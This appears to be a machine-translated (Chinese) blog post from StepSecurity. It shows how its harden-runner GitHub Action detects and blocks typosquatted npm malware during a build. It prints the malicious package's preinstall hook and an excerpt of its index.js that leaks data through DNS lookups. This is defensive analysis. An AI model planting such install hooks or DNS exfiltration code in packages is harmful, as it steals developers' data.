<html>
<head>
<title>Detecting malware packages in GitHub Actions</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">检测GitHub操作中的恶意软件包</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/detecting-malware-packages-in-github-actions-7b93a9985635?source=collection_archive---------3-----------------------#2022-03-31">https://infosecwriteups.com/detecting-malware-packages-in-github-actions-7b93a9985635?source=collection_archive---------3-----------------------#2022-03-31</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="ad83" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="https://github.com/step-security/harden-runner" rel="noopener ugc nofollow" target="_blank">step-security/harden-runner</a>GitHub Action在GitHub托管的runner (Ubuntu VM)上安装安全代理来监控构建过程。该代理监视每个步骤的进程、文件和网络活动，并可用于将出站网络呼叫限制到允许的端点。</p><p id="eb5a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最近几个恶意软件包被<a class="ae kl" href="https://www.techradar.com/news/microsoft-azure-developers-targeted-with-flood-of-malicious-npm-packages" rel="noopener ugc nofollow" target="_blank">发布</a>到NPM注册表。在这篇博文中，我将通过harden-runner的监控镜头向你展示这些包的行为。</p><p id="a864" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了分析它们的行为，两个恶意包作为依赖项被添加到package.json文件中。在真实的场景中，开发人员可能会无意中在他们的应用程序中使用这些恶意的包，而他们本打算使用不同的包。这叫<strong class="jp ir">包</strong> <strong class="jp ir">错别字</strong>。例如core-client-rest，恶意包的名称类似于合法包@azure/core-client。</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="e528" class="kv kw iq kr b gy kx ky l kz la">{<br/>  "name": "npmtest",<br/>  "version": "1.0.0",<br/>  "description": "",<br/>  "main": "test.js",<br/>  "dependencies": {<br/>    <strong class="kr ir">"core-client-rest": "99.10.9",<br/>    "dazaar-cli": "99.10.9"</strong><br/>  }<br/>}</span></pre><p id="f857" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">GitHub Actions工作流程的第一步是<a class="ae kl" href="https://github.com/step-security/harden-runner" rel="noopener ugc nofollow" target="_blank">step-security/harden-runner</a>。harden-runner被配置为只允许对github.com(下载代码)和registry.npmjs.org(下载依赖项)的出站调用。然后，工作流在最后一步运行<strong class="jp ir"> npm install </strong>。您可以以这种方式使用harden-runner来执行行为分析，并检测工作流中的恶意依赖关系。</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="8e19" class="kv kw iq kr b gy kx ky l kz la">name: npm_ci<br/>on: [push, pull_request, workflow_dispatch]</span><span id="3581" class="kv kw iq kr b gy lb ky l kz la">jobs:<br/>  test:<br/>    runs-on: ubuntu-latest</span><span id="cf7e" class="kv kw iq kr b gy lb ky l kz la">steps:<br/>      - uses: step-security/harden-runner@v1<br/>        with:<br/>          egress-policy: block<br/>          allowed-endpoints: &gt;<br/>            <strong class="kr ir">github.com:443<br/>            registry.npmjs.org:443</strong><br/>      - uses: actions/checkout@v2<br/>      - uses: actions/setup-node@v1<br/>        with:<br/>          node-version: "16"<br/>      - run: <strong class="kr ir">npm install</strong></span></pre><p id="b83d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在正常情况下，出站呼叫只会被发送到允许的端点。<strong class="jp ir">不过，在这种情况下，会发出、检测并阻止额外的出站呼叫</strong>。如果没有使用harden-runner，该恶意软件就会成功渗透敏感数据。然而，harden-runner阻止了这种情况的发生，并捕获了恶意软件。你可以在这里看到实际的GitHub Actions工作流程。</p><figure class="km kn ko kp gt ld gh gi paragraph-image"><div class="gh gi lc"><img src="../Images/74eda6ed8d8027b4a0304163e0db7862.png" data-original-src="https://miro.medium.com/v2/resize:fit:1398/format:webp/1*apFdtklDpx7EumaXuL08cw.png"/></div><figcaption class="lg lh gj gh gi li lj bd b be z dk translated">step-security/harden-runner GitHub处理措施检测并阻止了来自恶意软件包的出站呼叫</figcaption></figure><p id="07f1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这些出站调用是因为恶意软件包正在运行预安装步骤，该步骤正在执行JavaScript代码以进行出站调用。这是一个恶意软件包的package.json。它有一个运行index.js的预安装步骤</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="b741" class="kv kw iq kr b gy kx ky l kz la">{<br/> "name": "core-client-rest",<br/> "version": "99.10.9",<br/> "description": "azbit package",<br/> "main":"index.js",<br/> "scripts":{<br/> "test":"echo 'error no test specified' &amp;&amp; exit 1",<br/> "<strong class="kr ir">preinstall</strong>":"node index.js"<br/> },<br/>"author":"",<br/>"License":"ISC"<br/>}</span></pre><p id="96b6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有趣的是，对超长域的第一个调用是DNS渗漏调用。恶意软件包的index.js文件中的这段代码使用<strong class="jp ir"> dns.lookup </strong>来过滤数据。DNS渗透是一种常见的逃避检测的技术。</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="e2dc" class="kv kw iq kr b gy kx ky l kz la">var qs = toName(td);</span><span id="d313" class="kv kw iq kr b gy lb ky l kz la">if(isValid(td.hn,td.c,td.un,td.dirs)){</span><span id="e409" class="kv kw iq kr b gy lb ky l kz la">for(var j=0;j&lt;qs.length;j++){</span><span id="141c" class="kv kw iq kr b gy lb ky l kz la"><strong class="kr ir">dns.lookup</strong>(qs[j], function(err, result) {</span><span id="4bb9" class="kv kw iq kr b gy lb ky l kz la">//console.log(result)</span><span id="9d86" class="kv kw iq kr b gy lb ky l kz la">});</span><span id="f359" class="kv kw iq kr b gy lb ky l kz la">}</span></pre><p id="1cc6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="https://github.com/step-security/harden-runner" rel="noopener ugc nofollow" target="_blank">step-security/harden-runner</a>除了通过发送到TCP/ UDP的流量，GitHub操作还可以检测DNS渗透企图。代理在临时虚拟机上运行DNS代理，以监控和阻止DNS流量。这就是DNS渗透尝试被阻止的原因，也是注释显示“<em class="lk">域名的DNS解析被阻止</em>”的原因</p><p id="52b2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以使用SupplyChainGoat的<a class="ae kl" href="https://github.com/step-security/supply-chain-goat/blob/main/CompromisedDependency.md" rel="noopener ugc nofollow" target="_blank">依赖关系行为分析</a>中的实践教程来尝试这些步骤。<a class="ae kl" href="https://github.com/step-security/supply-chain-goat" rel="noopener ugc nofollow" target="_blank">supplychaingaot</a>有实践教程来学习软件供应链安全。本教程使用了一个恶意软件模拟器包，而不是使用实际的恶意软件包，这些恶意软件包现在已经从NPM注册表中删除了。</p><p id="a9b2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您有任何问题或反馈，请使用<a class="ae kl" href="https://www.stepsecurity.io" rel="noopener ugc nofollow" target="_blank">https://www . step security . io</a>联系我们</p></div></div>    
</body>
</html>